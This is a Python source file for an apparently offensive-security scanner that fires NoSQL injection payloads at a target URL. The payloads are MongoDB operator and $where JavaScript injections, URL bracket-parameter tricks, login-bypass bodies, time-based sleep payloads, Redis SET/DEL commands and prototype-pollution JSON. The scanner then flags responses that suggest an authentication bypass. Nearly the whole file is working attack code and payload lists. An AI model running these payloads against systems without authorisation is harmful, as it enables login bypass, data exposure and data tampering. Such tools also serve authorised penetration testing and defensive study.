"""Deep NoSQL injection detection — boolean-based, time-based, multi-DB, operator abuse."""

import httpx
import json
import urllib.parse
import time
import asyncio

# --- MongoDB Operator Payloads ---
MONGODB_PAYLOADS = [
    ("$ne", {"$ne": ""}, "Returns all docs (auth bypass)"),
    ("$gt", {"$gt": ""}, "Returns all docs (comparison bypass)"),
    ("$gte", {"$gte": ""}, "Returns all docs (gte bypass)"),
    ("$lt", {"$lt": None}, "Returns all docs (lt bypass)"),
    ("$regex", {"$regex": ".*"}, "Regex match all"),
    ("$nin", {"$nin": []}, "Not in empty set = all docs"),
    ("$exists", {"$exists": True}, "Exists bypass"),
    ("$type", {"$type": "string"}, "Type mismatch"),
    ("$where_js", {"$where": "this.password == this.username"}, "JS where injection"),
    ("$where_true", {"$where": "1==1"}, "Always true where"),
    ("$where_func", {"$where": "function(){return true}"}, "Function where injection"),
    ("$or_bypass", {"$or": [{"username": "admin"}, {"username": "nosuchuser"}]}, "OR auth bypass"),
    ("$and_bypass", {"$and": [{"password": {"$ne": ""}}, {"username": "admin"}]}, "AND auth bypass"),
    ("$not_ne", {"$not": {"$ne": ""}}, "Not equal inversion"),
    ("$expr", {"$expr": {"$eq": [1, 1]}}, "Expression injection"),
    ("$accumulator", {"$accumulator": {"init": "function(){return 0}", "accumulate": "function(){return 0}", "merge": "function(){return 0}", "finalize": "function(){return 0}"}, "$group": {"_id": None}}, "Accumulator injection"),
]

# --- URL Parameter Injection ---
URL_PAYLOADS = [
    ("$ne", {"username[$ne]": "", "password[$ne]": ""}),
    ("$gt", {"username[$gt]": "", "password[$gt]": ""}),
    ("$regex", {"username[$regex]": ".*", "password[$regex]": ".*"}),
    ("$where", {"username[$where]": "1==1", "password[$where]": "1==1"}),
    ("$exists", {"username[$exists]": True, "password[$exists]": True}),
    ("$in", {"username[$in]": ["admin", "root"], "password[$in]": ["admin", "root"]}),
    ("$nin", {"username[$nin]": [], "password[$nin]": []}),
    ("$or", {"$or": [{"username": "admin"}, {"password": {"$ne": ""}}]}),
    ("dot_notation", {"user.username": "admin", "user.password": {"$ne": ""}}),
    ("array_index", {"username.0": "admin", "password.0": {"$ne": ""}}),
]

# --- MongoDB Time-Based Blind ---
TIME_PAYLOADS = [
    ("$where_sleep", {"$where": "function(){var x=date; x.sleep(5000); return true;}", "username": "admin"}, 5),
    ("$where_date", {"$where": "function(){sleep(5000); return true;}", "username": "admin"}, 5),
    ("$expr_sleep", {"$expr": {"$function": {"body": "function(){sleep(5000);return true}", "args": [], "lang": "js"}}}, 5),
]

# --- CouchDB Payloads ---
COUCHDB_PAYLOADS = [
    ("couchdb_or", {"$or": [{"_id": "admin"}, {"_id": {"$ne": ""}}]}, "CouchDB OR bypass"),
    ("couchdb_ne", {"_id": {"$ne": ""}}, "CouchDB not equal"),
]

# --- Redis Payloads ---
REDIS_PAYLOADS = [
    ("redis_set", "SET injected_key true", "Redis SET injection"),
    ("redis_del", "DEL critical_key", "Redis DEL injection"),
]

# --- Node.js / Express specific ---
NODEJS_PAYLOADS = [
    ("proto_pollution", '{"__proto__":{"isAdmin":true}}', "Prototype pollution via JSON"),
    ("constructor_override", '{"constructor":{"prototype":{"isAdmin":true}}}', "Constructor prototype pollution"),
]

# --- MongoDB Auth Bypass Bypasses ---
AUTH_BYPASS_PAYLOADS = [
    ("auth_ne_empty", {"username": {"$ne": ""}, "password": {"$ne": ""}}, "Both ne empty"),
    ("auth_ne_admin", {"username": "admin", "password": {"$ne": ""}}, "Admin + ne password"),
    ("auth_gt_empty", {"username": "admin", "password": {"$gt": ""}}, "Admin + gt empty"),
    ("auth_regex", {"username": {"$regex": "^admin"}, "password": {"$regex": ".*"}}, "Admin regex + any password"),
    ("auth_or_empty", {"$or": [{"username": "admin", "password": {"$ne": ""}}, {"username": {"$ne": ""}, "password": {"$ne": ""}}]}, "OR bypass double"),
    ("auth_nin_empty", {"username": {"$nin": [""]}, "password": {"$nin": [""]}}, "Nin empty set"),
    ("auth_exists", {"username": {"$exists": True}, "password": {"$exists": True}}, "Both exist"),
]


def _detect_db_type(body: str, status: int) -> str:
    """Detect which NoSQL database is in use."""
    lower = body.lower()
    if "mongodb" in lower or "mongo" in lower:
        return "MongoDB"
    if "couchdb" in lower or "couch" in lower:
        return "CouchDB"
    if "redis" in lower:
        return "Redis"
    if "dynamodb" in lower:
        return "DynamoDB"
    if status == 400 and "parseerror" in lower:
        return "MongoDB (parse error)"
    if status == 500 and ("javascript" in lower or "syntaxerror" in lower):
        return "MongoDB (JS error)"
    return "Unknown"


def _extract_evidence(body: str, indicators: list[str]) -> str:
    """Extract evidence snippet around indicator matches."""
    for indicator in indicators:
        idx = body.lower().find(indicator.lower())
        if idx != -1:
            start = max(0, idx - 80)
            end = min(len(body), idx + 120)
            return body[start:end]
    return body[:300]


async def nosql_inject(target: str, param: str = "user") -> dict:
    """Deep NoSQL injection detection with boolean-based, time-based, multi-DB, operator abuse."""
    if not target.startswith(("http://", "https://")):
        target = f"https://{target}"

    parsed = urllib.parse.urlparse(target)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    test_params = [param] if param else ["user", "username", "email", "login", "account", "auth", "admin"]

    results = []
    detected_db = None
    baseline_status = None
    baseline_size = 0

    async with httpx.AsyncClient(timeout=15.0, verify=False, follow_redirects=False) as client:
        # Baseline
        try:
            baseline_resp = await client.post(base, data={})
            baseline_status = baseline_resp.status_code
            baseline_size = len(baseline_resp.text)
            detected_db = _detect_db_type(baseline_resp.text, baseline_status)
        except Exception:
            pass

        for p in test_params:
            # --- MongoDB JSON Body Injection ---
            for name, payload, description in MONGODB_PAYLOADS:
                try:
                    headers = {"Content-Type": "application/json"}
                    body_data = json.dumps({p: payload})
                    resp = await client.post(base, content=body_data, headers=headers)
                    resp_size = len(resp.text)
                    resp_status = resp.status_code

                    diff_status = resp_status != baseline_status
                    diff_size = abs(resp_size - baseline_size) > 20
                    # MongoDB auth bypass indicators
                    auth_bypass_indicators = ["token", "session", "welcome", "success", "logged", "profile", "admin"]
                    has_auth_indicator = any(ind in resp.text.lower() for ind in auth_bypass_indicators)

                    suspicious = diff_status or diff_size or has_auth_indicator
                    if suspicious:
                        db_type = _detect_db_type(resp.text, resp_status)
                        results.append({
                            "technique": "mongodb_json_injection",
                            "param": p,
                            "payload": name,
                            "payload_data": {p: {k: v for k, v in payload.items()} if isinstance(payload, dict) else str(payload)[:100]},
                            "description": description,
                            "db_detected": db_type,
                            "status": resp_status,
                            "size_diff": resp_size - baseline_size,
                            "has_auth_indicator": has_auth_indicator,
                            "evidence": _extract_evidence(resp.text, auth_bypass_indicators) if has_auth_indicator else resp.text[:200],
                            "risk": "CRITICAL" if has_auth_indicator else "HIGH",
                            "confidence": "high" if has_auth_indicator else "medium",
                        })
                        if db_type != "Unknown" and not detected_db:
                            detected_db = db_type
                except Exception:
                    continue

            # --- URL Parameter Injection ---
            for name, payload in URL_PAYLOADS:
                try:
                    query_string = urllib.parse.urlencode(payload)
                    url = f"{base}?{query_string}"
                    resp = await client.get(url)
                    resp_size = len(resp.text)

                    diff_status = resp.status_code != baseline_status
                    diff_size = abs(resp_size - baseline_size) > 20
                    auth_bypass_indicators = ["token", "session", "welcome", "success", "logged", "profile", "admin"]
                    has_auth_indicator = any(ind in resp.text.lower() for ind in auth_bypass_indicators)

                    if diff_status or diff_size or has_auth_indicator:
                        results.append({
                            "technique": "mongodb_url_injection",
                            "param": p,
                            "payload": name,
                            "payload_data": {k: v[:50] if isinstance(v, str) else str(v)[:50] for k, v in payload.items()},
                            "status": resp.status_code,
                            "size_diff": resp_size - baseline_size,
                            "has_auth_indicator": has_auth_indicator,
                            "risk": "CRITICAL" if has_auth_indicator else "HIGH",
                            "confidence": "high" if has_auth_indicator else "medium",
                        })
                        break
                except Exception:
                    continue

            # --- Auth Bypass Testing ---
            for name, payload, description in AUTH_BYPASS_PAYLOADS:
                try:
                    headers = {"Content-Type": "application/json"}
                    # Try each auth-related field
                    for field in ["user", "account", "login"]:
                        body_data = json.dumps({field: payload})
                        resp = await client.post(base, content=body_data, headers=headers)
                        auth_indicators = ["token", "session", "welcome", "success", "logged", "profile", "dashboard"]
                        has_auth = any(ind in resp.text.lower() for ind in auth_indicators)

                        if has_auth:
                            results.append({
                                "technique": "auth_bypass",
                                "param": field,
                                "payload": name,
                                "description": description,
                                "evidence": _extract_evidence(resp.text, auth_indicators),
                                "status": resp.status_code,
                                "risk": "CRITICAL",
                                "confidence": "confirmed",
                            })
                            break
                except Exception:
                    continue

            # --- Time-Based Blind ---
            for name, payload, expected_delay in TIME_PAYLOADS:
                try:
                    headers = {"Content-Type": "application/json"}
                    body_data = json.dumps({p: payload}) if isinstance(payload, dict) else payload
                    start_time = time.time()
                    resp = await client.post(base, content=body_data, headers=headers)
                    elapsed = time.time() - start_time

                    if elapsed >= expected_delay - 1:
                        results.append({
                            "technique": "nosql_time_blind",
                            "param": p,
                            "payload": name,
                            "elapsed_seconds": round(elapsed, 2),
                            "expected_delay": expected_delay,
                            "status": resp.status_code,
                            "risk": "CRITICAL",
                            "confidence": "confirmed" if elapsed >= expected_delay else "probable",
                        })
                except httpx.TimeoutException:
                    results.append({
                        "technique": "nosql_time_blind",
                        "param": p,
                        "payload": name,
                        "elapsed_seconds": "TIMEOUT",
                        "expected_delay": expected_delay,
                        "status": "TIMEOUT",
                        "risk": "CRITICAL",
                        "confidence": "high",
                    })
                except Exception:
                    continue

            # --- Prototype Pollution (Node.js) ---
            for name, payload, description in NODEJS_PAYLOADS:
                try:
                    headers = {"Content-Type": "application/json"}
                    resp = await client.post(base, content=payload, headers=headers)
                    resp_size = len(resp.text)

                    if resp.status_code != baseline_status or abs(resp_size - baseline_size) > 20:
                        results.append({
                            "technique": "prototype_pollution",
                            "param": p,
                            "payload": name,
                            "description": description,
                            "status": resp.status_code,
                            "risk": "HIGH",
                            "confidence": "medium",
                        })
                except Exception:
                    continue

    return {
        "target": target,
        "params_tested": test_params,
        "detected_db": detected_db,
        "results": results,
        "vulnerable": len(results) > 0,
        "total_findings": len(results),
        "techniques_found": list(set(r["technique"] for r in results)),
        "risk_summary": {
            "critical": sum(1 for r in results if r.get("risk") == "CRITICAL"),
            "high": sum(1 for r in results if r.get("risk") == "HIGH"),
            "medium": sum(1 for r in results if r.get("risk") == "MEDIUM"),
        },
    }
